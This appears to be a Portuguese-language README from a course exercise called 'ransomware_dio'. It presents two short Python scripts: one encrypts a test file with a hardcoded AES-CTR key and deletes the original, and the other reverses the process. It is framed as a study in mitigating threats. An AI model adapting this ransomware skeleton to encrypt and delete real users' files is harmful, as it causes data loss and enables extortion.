# ransomware_dio
Ransonware criado à partir de Python

Neste trabalho foram utilizados 2 arquivos escritos em python e um arquivo txt que simula o arquivo criptogrado por um Hacker Mal Intencionado

Um arquivo criptogafa, ficando impossível a leitura do mesmo

O outro arquivo descriptogra e retorna o arquivo ao original

Abaixo temos o codigo principal dos arquivos de criptogria e descriptografia

Lembrando que este é um estudo para mitigar falhas de segurança e combater pessoas mal intencionadas

Utilizar conhecimentos Hacker de forma maliciosa, pode acarretar diversas consequências

________________________________

Criptografia

import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

___________________________________

Descriptografia

import os
import pyaes

## abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()

